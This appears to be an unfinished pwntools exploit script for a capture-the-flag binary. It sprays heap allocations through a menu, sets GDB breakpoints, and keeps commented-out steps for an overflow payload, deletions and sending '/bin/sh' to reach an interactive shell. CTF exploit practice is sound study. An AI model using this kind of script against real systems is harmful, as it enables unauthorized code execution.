#!/usr/bin/python3

from pwn import *

exe = ELF('main', checksec=False)

context.binary = exe
context.log_level = "DEBUG"
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x250C  
        b* 0x555555556609
        brva 0x1FC9
        brva 0x1F84
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

def choice(num):
    global p
    p.sendlineafter(b": ", str(num).encode())

# login boilerplate, doesn't matter for exploit
choice(2)
p.sendlineafter(b": ", b"test")
p.sendlineafter(b": ", b"test")

choice(1)
p.sendlineafter(b": ", b"test")
p.sendlineafter(b": ", b"test")
for i in range(169):
    choice(1)
    p.sendlineafter(b"length: ", b"256")
    p.sendlineafter(b"string: ", b"A"*256)
    msg = p.recvline()
    assert b"successfully" in msg, f"Failed! {msg = }"

choice(1)
p.sendlineafter(b"length: ", b"256")
p.sendlineafter(b"string: ", b"A"*256)
GDB()

# choice(1)
# p.sendlineafter(b"length: ", b"89")
# p.sendlineafter(b"string: ", b"A"*80 + p32(0) + p32(1) + b"\x3b")

# for i in range(160):
#     choice(2)
#     p.sendlineafter(b"delete: ", b"0")
#     msg = p.recvline()
#     assert b"successfully" in msg, f"Failed! {msg = }"
    
# choice(5)
# p.sendlineafter(b": ", b"/bin/sh")


p.interactive()
